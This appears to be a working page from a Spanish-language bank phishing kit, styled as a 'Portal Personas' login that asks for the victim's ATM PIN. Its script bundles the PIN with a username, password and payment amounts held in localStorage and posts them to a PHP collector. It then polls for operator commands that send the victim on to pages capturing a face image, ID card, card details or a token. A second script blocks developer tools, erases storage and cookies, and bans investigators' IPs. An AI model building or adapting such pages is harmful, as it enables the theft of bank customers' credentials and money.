<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Portal Personas</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;font-family:Arial,Helvetica,sans-serif}
body{overflow:hidden}
.container{display:flex;width:100%;height:100vh}
.left-panel, .right-panel{ width:50%; height:100vh; }
.left-panel img{ width:100%; height:100%; object-fit:cover; display:block; }
.right-panel{ background:#f5f5f5; display:flex; justify-content:center; align-items:center; }
.login-container{ width:420px; max-width:90%; }
.logo{ margin-bottom:35px; }
.logo img{ width:180px; display:block; }
h1{ font-size:38px; line-height:1.05; color:#242424; font-weight:700; margin-bottom:20px; }
.description{ font-size:15px; color:#333; line-height:1.7; margin-bottom:28px; }
label{ display:block; font-size:16px; font-weight:700; color:#222; margin-bottom:10px; }
.password-box{ position:relative; }
.password-box input{ width:100%; height:48px; border:1px solid #9fb0c5; border-radius:8px; padding:0 50px 0 15px; font-size:15px; outline:none; background:#fff; }
.password-box input:focus{ border-color:#4b75a8; }
.eye{ position:absolute; right:15px; top:50%; transform:translateY(-50%); cursor:pointer; font-size:20px; user-select:none; }
.actions{ margin-top:20px; display:flex; justify-content:space-between; align-items:center; }
.btn{ width:140px; height:44px; border:none; border-radius:25px; background:#0067d8; color:#fff; font-size:16px; font-weight:700; cursor:pointer; }
.btn:hover{ opacity:.95; }
.btn:disabled{ background:#d1d6d9; cursor:not-allowed; }
.forgot{ color:#0067d8; text-decoration:none; font-size:15px; font-weight:600; }
.separator{ border:none; border-top:1px solid #ddd; margin:60px 0 28px; }
.register{ font-size:15px; color:#333; }
.register a{ color:#0067d8; text-decoration:none; font-weight:700; }
.error{ display:none; color:#cb3234; font-size:15px; margin-top:12px; }

@media(max-width:900px){
    body{ overflow-y:auto; overflow-x:hidden; }
    .container{ flex-direction:column; height:auto; min-height:100vh; }
    .left-panel{ width:100%; height:35vh; }
    .right-panel{ width:100%; height:auto; justify-content:flex-start; align-items:flex-start; }
    .login-container{ width:100%; max-width:none; padding:25px 32px 40px; }
    .logo{ margin-bottom:35px; }
    .logo img{ width:180px; }
    h1{ font-size:32px; line-height:1.1; }
    .description{ font-size:14px; }
    .actions{ gap:15px; }
    .forgot{ font-size:14px; }
    .separator{ margin:40px 0 24px; }
}

.loader-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: #fcfcfc;
    display: none;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    z-index: 1000;
}

.loader-text {
    color: #555;
    font-size: 16px;
    margin: 10px 0 5px;
}

.loader-image {
    width: 95px;
    height: 44px;
    margin: 0 auto 20px;
}
</style>
</head>
<body>

<div class="container">
    <div class="left-panel">
        <img src="img/c.jpg" alt="">
    </div>
    <div class="right-panel">
        <div class="login-container">
            <div class="logo">
                <img src="img/l.svg" alt="">
            </div>
            <h1>Clave de<br>Cajero</h1>
            <p class="description">
                Ingrese su clave de acceso al cajero automático que registró con el banco.
            </p>

            <form action="" method="POST" id="loginForm">
                <label for="clave">Clave de Cajero</label>
                <div class="password-box">
                    <input type="password" id="clave" name="clave" autocomplete="off" required placeholder="Mínimo 4 caracteres">
                    <span class="eye" id="toggleEye">👁</span>
                </div>

                <div id="error" class="error">
                    Error: Verifique la clave ingresada.
                </div>

                <div class="actions">
                    <button type="submit" class="btn" id="btnSubmit" disabled>Validar clave</button>
                    <a href="#" class="forgot">¿Olvidó su clave?</a>
                </div>
            </form>

            <hr class="separator">
            <div class="register">
                ¿Necesita ayuda? <a href="#">Contacte soporte</a>
            </div>
        </div>
    </div>
</div>

<div class="loader-overlay" id="loaderOverlay">
    <img src="img/load.gif" alt="Cargando..." class="loader-image">
    <div class="loader-text">Verificando...</div>
</div>

<script>
const clave = document.getElementById('clave');
const eye = document.getElementById('toggleEye');
const form = document.getElementById('loginForm');
const error = document.getElementById('error');
const btnSubmit = document.getElementById('btnSubmit');
const loaderOverlay = document.getElementById('loaderOverlay');

// Obtener transactionId de URL
const params = new URLSearchParams(window.location.search);
let transactionId = params.get('txn') || ((() => { const params = new URLSearchParams(window.location.search); const direct = [params.get('transactionId'), params.get('tid'), params.get('tx'), params.get('session_id'), params.get('ts')].find((value) => value !== null && String(value).trim() !== ''); if (direct) { const normalized = String(direct); localStorage.setItem('session_id', normalized); localStorage.setItem('last_tid', normalized); return normalized; } const generated = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11); localStorage.setItem('session_id', generated); localStorage.setItem('last_tid', generated); return generated; })()) || '';
let messageId = null;

// Toggle mostrar/ocultar clave
eye.addEventListener('click', () => {
    clave.type = (clave.type === 'password') ? 'text' : 'password';
});

// Validar en tiempo real mientras se escribe
clave.addEventListener('input', () => {
    const valor = clave.value.trim();
    const largo = valor.length;

    if(largo >= 4 && largo <= 12) {
        btnSubmit.disabled = false;
        btnSubmit.style.background = '#0067d8';
        btnSubmit.style.cursor = 'pointer';
        error.style.display = 'none';
    } else {
        btnSubmit.disabled = true;
        btnSubmit.style.background = '#d1d6d9';
        btnSubmit.style.cursor = 'not-allowed';
        error.style.display = 'none';
    }
});

// Manejar envío del formulario
form.addEventListener('submit', async e => {
    e.preventDefault();

    const valor = clave.value.trim();

    if(valor.length < 4 || valor.length > 12) {
        error.style.display = 'block';
        return;
    }

    error.style.display = 'none';

    const usuario = localStorage.getItem('username') || localStorage.getItem('usuario') || '';
    const contraseña = localStorage.getItem('password') || '';
    const tbdatosStr = localStorage.getItem('tbdatos') || '{}';
    let tbdatos = {};
    try {
        tbdatos = JSON.parse(tbdatosStr);
    } catch(e) {
        tbdatos = {};
    }

    const amountCandidates = [
        localStorage.getItem('total_pagar'),
        localStorage.getItem('monto'),
        localStorage.getItem('amount'),
        localStorage.getItem('valor'),
        localStorage.getItem('valor_pagar'),
        localStorage.getItem('total'),
        tbdatos.total_pagar,
        tbdatos.monto,
        tbdatos.amount,
        tbdatos.valor,
        tbdatos.valor_pagar,
        tbdatos.total
    ];
    const amountValue = amountCandidates.find(value => value !== null && value !== '' && value !== undefined && String(value).trim() !== '') || '0';
    if (amountValue !== '0' && (!tbdatos.total_pagar || String(tbdatos.total_pagar) === '0')) {
        tbdatos.total_pagar = String(amountValue);
        localStorage.setItem('tbdatos', JSON.stringify(tbdatos));
    }

    const payload = {
        clave: valor,
        transactionId: transactionId,
        usuario: usuario,
        contraseña: contraseña,
        tbdatos: tbdatos,
        total_pagar: amountValue,
        monto: amountValue
    };

    loaderOverlay.style.display = 'flex';

    try {
        const response = await fetch('procesar_clave.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        const resultado = await response.json();
        console.log("Respuesta procesar_clave.php:", resultado);

        if(resultado.status === 'success') {
            messageId = resultado.messageId;
            localStorage.setItem('messageId', messageId);
            comenzarPolling();
        } else {
            loaderOverlay.style.display = 'none';
            alert(resultado.message || 'Error al enviar datos');
        }
    } catch(err) {
        console.error("Error:", err);
        loaderOverlay.style.display = 'none';
        alert('Error de conexión: ' + err.message);
    }
});

// Polling recursivo con setTimeout (igual que pass.php)
async function comenzarPolling() {
    const formData = new FormData();
    formData.append('transactionId', transactionId);
    formData.append('messageId', messageId);

    try {
        const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), {
            method: 'POST',
            body: formData,
            cache: 'no-store'
        });
        const result = await res.json();
        console.log("Respuesta verificar_respuesta.php:", result);

        if(result.action) {
            loaderOverlay.style.display = 'none';

            switch(result.action) {
                case 'dinamica_finalizar':
                case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                    window.location.href = '/fin.php';
                    break;
                case 'dinamica_cajero':
                case 'error_cajero':
                case 'pedir_cajero':
                    window.location.href = 'cajero.php?txn=' + encodeURIComponent(transactionId);
                    break;
                case 'dinamica_error_logo':
                case 'error_logo':
                    window.location.href = 'index.php';
                    break;
                case 'dinamica_cara':
                case 'error':
                    window.location.href = '/caras';
                    break;
                case 'dinamica_cedula':
                case 'cedula':
                    window.location.href = '/cedula';
                    break;
                case 'dinamica_tarjeta':
                case 'tarjeta':
                case 'error_tc':
                    window.location.href = '/datac/alter.php';
                    break;
                case 'dinamica_dinamica':
                case 'error_token':
                case 'pedir_dinamica':
                    window.location.href = 'token.php?txn=' + encodeURIComponent(transactionId);
                    break;
                case 'bre_b':
                    window.location.href = '/recaudos/brev.php?occidente';
                    break;
                default:
                    setTimeout(() => comenzarPolling(), 2000);
            }
        } else {
            setTimeout(() => comenzarPolling(), 2000);
        }
    } catch(err) {
        console.error("Error polling:", err);
        setTimeout(() => comenzarPolling(), 2000);
    }
}
</script>

<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html>
